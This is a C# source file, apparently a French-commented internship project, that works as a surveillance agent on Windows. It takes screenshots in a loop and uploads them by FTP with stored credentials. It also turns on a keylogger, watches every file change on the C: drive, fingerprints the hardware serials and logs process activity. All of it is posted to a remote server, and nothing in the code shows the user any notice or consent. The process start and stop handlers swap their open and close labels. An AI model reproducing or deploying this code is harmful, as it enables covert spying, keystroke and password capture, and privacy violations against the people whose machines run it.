using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace StageprojectService
{
   public static class Methods
    {
        #region //@IP public 
        public static String getAdressIp()
        {
            WebClient webClient = new WebClient();
            string publicIp = webClient.DownloadString("https://api.ipify.org");
            return publicIp;
        }

        #endregion

        #region //retourne le nom de la machine avec nom d'untilisateur
        public static String identifiant()
        {
            return Environment.MachineName + "-" + Environment.UserName;
        }

        #endregion

        #region  // retourne timeStamp de la date courante
        public static String GetTimestamp(DateTime value)
        {
            return ((Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds).ToString();

        }

        #endregion

        #region // SCREENSHOT


        public static void screenShot()
        {
            while (true)
            {   
                // verifier la connection internet
                if(CheckForInternetConnection())
                {
                    takescreen();
                    Thread.Sleep(Data.config.intervalleScreenshot * 1000);
                }
               
            }
        }

        public static void takescreen()
        {
            String strAppDir = Directory.GetParent(Application.ExecutablePath).ToString();

            localurl = System.IO.Path.Combine(strAppDir, "tmp_img");

            System.IO.Directory.CreateDirectory(localurl);


            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                               Screen.PrimaryScreen.Bounds.Height,
                               PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            String timeStamp = GetTimestamp(DateTime.Now);          
            //sauvgarder l'image dans un dossier avec ftp
            UploadFileToFTP(bmpScreenshot);

        }
       
        public static String localurl = String.Empty;
         static void UploadFileToFTP(Bitmap image)
        {
            try
            {
                String timeStamp = GetTimestamp(DateTime.Now);
                string imgName = "IMG_" + timeStamp + ".png";
                localurl = System.IO.Path.Combine(localurl, imgName);
                image.Save(localurl, ImageFormat.Png);
                string filename = imgName;
                string ftpfullpath = Data.ftpurl + imgName;
                FtpWebRequest ftp = (FtpWebRequest)FtpWebRequest.Create(ftpfullpath);
                ftp.Credentials = new NetworkCredential(Data.ftpusername, Data.ftppassword);

                ftp.KeepAlive = true;
                ftp.UseBinary = true;
                ftp.Method = WebRequestMethods.Ftp.UploadFile;

                FileStream fs = File.OpenRead(localurl);
                byte[] buffer = new byte[fs.Length];
                fs.Read(buffer, 0, buffer.Length);
                fs.Close();

                Stream ftpstream = ftp.GetRequestStream();
                ftpstream.Write(buffer, 0, buffer.Length);
                ftpstream.Close();
                File.Delete(localurl);
                imgName = '/'+imgName;
               var response = saveDB(Data.dbserver + "screenshot/save", "{\"imagePath\":\"images"+imgName+"\",\"user\":{ \"machineName\":\""+identifiant()+"\"}}");
              
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }


        #endregion

        #region // verification de changement des fichiers
        private static FileSystemWatcher myWatcher;
        private static string DirPath = "c:/";
        public static void fileMonitoring()
        {
            if(Directory.Exists(DirPath))
            {
                myWatcher = new FileSystemWatcher(DirPath);
                myWatcher.EnableRaisingEvents = true;
                myWatcher.IncludeSubdirectories = true;
                myWatcher.Created += new FileSystemEventHandler(myWatcher_Created);
                myWatcher.Changed += new FileSystemEventHandler(myWatcher_Changed);
                myWatcher.Deleted += new FileSystemEventHandler(myWatcher_Deleted);
                myWatcher.Renamed += new RenamedEventHandler(myWatcher_Renamed);
            }
           
        }

        // Created Event
        public static void myWatcher_Created(object sender, FileSystemEventArgs e)
        {
            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("ProgramData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("tmp_img") && !e.FullPath.Contains("xampp") && !e.FullPath.Contains("resources"))
            {
                Console.WriteLine("ChangeType :: " + e.ChangeType.ToString() + "\nFullPath ::" + e.FullPath.ToString() + "\n Date ::" + DateTime.Now.ToString() + "\n\n");
                var response = saveDB(Data.dbserver + "file/save", "{\"newName\":\""+CleanInput( e.FullPath.ToString())+ "\",\"action\":\""+ e.ChangeType.ToString() + "\",\"oldName\":\" \",\"user\":{\"machineName\":\""+identifiant()+"\"}}");
            }
        }

        //Changed Event
        public static void myWatcher_Changed(object sender, FileSystemEventArgs e)
        {
            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("ProgramData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("tmp_img") && !e.FullPath.Contains("xampp") && !e.FullPath.Contains("resources"))
            {
                var response = saveDB(Data.dbserver + "file/save", "{\"newName\":\"" +CleanInput( e.FullPath.ToString()) + "\",\"action\":\"" + e.ChangeType.ToString() + "\",\"oldName\":\" \",\"user\":{\"machineName\":\"" + identifiant() + "\"}}");
                Console.WriteLine("ChangeType :: " + e.ChangeType.ToString() + "\nFullPath ::" + e.FullPath.ToString() + "\n Date ::" + DateTime.Now.ToString() + "\n\n");
            }
        }

        //Deleted Event
        public static void myWatcher_Deleted(object sender, FileSystemEventArgs e)
        {
            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("ProgramData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("tmp_img") && !e.FullPath.Contains("xampp") && !e.FullPath.Contains("resources")) { 
                var response = saveDB(Data.dbserver + "file/save", "{\"newName\":\"" +CleanInput( e.FullPath.ToString()) + "\",\"action\":\"" + e.ChangeType.ToString() + "\",\"oldName\":\" \",\"user\":{\"machineName\":\"" + identifiant() + "\"}}");
                Console.WriteLine("ChangeType :: " + e.ChangeType.ToString() + "\nFullPath ::" + e.FullPath.ToString() + "\n Date ::" + DateTime.Now.ToString() + "\n\n");
            }
        }

        //Renamed Event
        public static void myWatcher_Renamed(object sender, RenamedEventArgs e)
        {
            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("ProgramData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("tmp_img") && !e.FullPath.Contains("xampp") && !e.FullPath.Contains("resources"))
            {
                var response = saveDB(Data.dbserver+"file/save", "{\"newName\":\"" +CleanInput( e.FullPath.ToString()) + "\",\"action\":\"" + e.ChangeType.ToString() + "\",\"oldName\":\""+CleanInput( e.OldFullPath.ToString())+"\",\"user\":{\"machineName\":\"" + identifiant() + "\"}}");
                Console.WriteLine("ChangeType :: " + e.ChangeType.ToString() + "\nFullPath ::" + e.FullPath.ToString() + "\nOld FileName :: " + e.OldName.ToString() + "\n Date ::" + DateTime.Now.ToString() + "\n\n");
            }
        }
        #endregion

        #region // Keylogger
        public static void Keylogger()
        {
                   
                Keylogger kl = new Keylogger();
                kl.Enabled = Data.config.keylogger; // enable key logging            
                kl.FlushInterval = 180000; // set buffer flush interval
               // kl.Flush2DB(@"c:\logfile.txt", true); // force buffer flush
                
        }

        #endregion

        #region // attendre l'ouvertur ou la fermeture  d'une processus
        public static ManagementEventWatcher start;
        public static ManagementEventWatcher stop;
       public static void processManagement()
        {
            var localHID = string.Empty;
            var mbs = new ManagementObjectSearcher("SELECT ProcessorID FROM Win32_Processor");
            var mbsList = mbs.Get();
            foreach (ManagementObject mo in mbsList)
                localHID += mo["ProcessorID"].ToString();
            mbs.Query.QueryString = "SELECT SerialNumber FROM Win32_BIOS";
            mbsList = mbs.Get();
            foreach (ManagementObject mo in mbsList)
                localHID += mo["SerialNumber"].ToString();
            mbs.Query.QueryString = "SELECT SerialNumber FROM Win32_BaseBoard";
            mbsList = mbs.Get();
            foreach (ManagementObject mo in mbsList)
                localHID += mo["SerialNumber"].ToString();

            var dat = Encoding.ASCII.GetBytes(localHID);
            var sha = new SHA1CryptoServiceProvider();
            localHID = BitConverter.ToString(sha.ComputeHash(dat)).Replace("-", "");
            Console.WriteLine(localHID);
             start = new ManagementEventWatcher("SELECT * FROM win32_ProcessStartTrace");
             stop = new ManagementEventWatcher("SELECT * FROM win32_ProcessStopTrace");
            start.EventArrived += Start_EventArrived;
            stop.EventArrived += Stop_EventArrived;
            start.Start();
            stop.Start();
            Console.ReadLine();
            //start.Stop();
            //stop.Stop();
        }

        public static void Stop_EventArrived(object sender, EventArrivedEventArgs e)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(string.Format("Process Close: {0}", e.NewEvent.Properties["ProcessName"].Value));
            var response = saveDB("http://localhost:8080/process/save", "{\"processName\":\""+ e.NewEvent.Properties["ProcessName"].Value+ "\",\"action\":\"ouverture\",\"user\":{\"machineName\":\""+identifiant()+"\"}}");

            foreach (var v in e.NewEvent.Properties)
            {
                Console.WriteLine(string.Format("   {0}: {1}", v.Name, v.Value));
            }
        }

        public static void Start_EventArrived(object sender, EventArrivedEventArgs e)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(string.Format("Process Started: {0}", e.NewEvent.Properties["ProcessName"].Value));
            var response = saveDB("http://localhost:8080/process/save", "{\"processName\":\"" + e.NewEvent.Properties["ProcessName"].Value + "\",\"action\":\"fermeture\",\"user\":{\"machineName\":\"" + identifiant() + "\"}}");

            foreach (var v in e.NewEvent.Properties)
            {
                Console.WriteLine(string.Format("   {0}: {1}", v.Name, v.Value));
            }
        }
        #endregion

        #region // sauvgarder les données dans la base de donnée         
        public async static Task<String> saveDB(String url, String data)
        {
            HttpClient http = new HttpClient();
            http.BaseAddress = new Uri(url);
            //http.DefaultRequestHeaders
            //.Accept
            //.Add(new MediaTypeWithQualityHeaderValue("application/json"));

            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "");
            request.Content = new StringContent(data, Encoding.UTF8, "application/json");//CONTENT-TYPE header
            //http.PostAsync(request)
            HttpResponseMessage msg = await http.SendAsync(request);
            string webresponse = await msg.Content.ReadAsStringAsync();
            return webresponse;
        }
        #endregion

        #region // eliminer les caractères speciaux 
        static string CleanInput(string strIn)
        {
            // Replace invalid characters with empty strings. 
            try
            {
                return Regex.Replace(strIn, @"[^\w\.@-]", "/",
                   RegexOptions.None, TimeSpan.FromSeconds(1.5));
            }
            // If we timeout when replacing invalid characters,  
            // we should return Empty. 
            catch (RegexMatchTimeoutException)
            {
                return String.Empty;
            }
        }
        #endregion

        #region // verifier l'existance de connection internet 
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("http://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }
        #endregion
    }
}
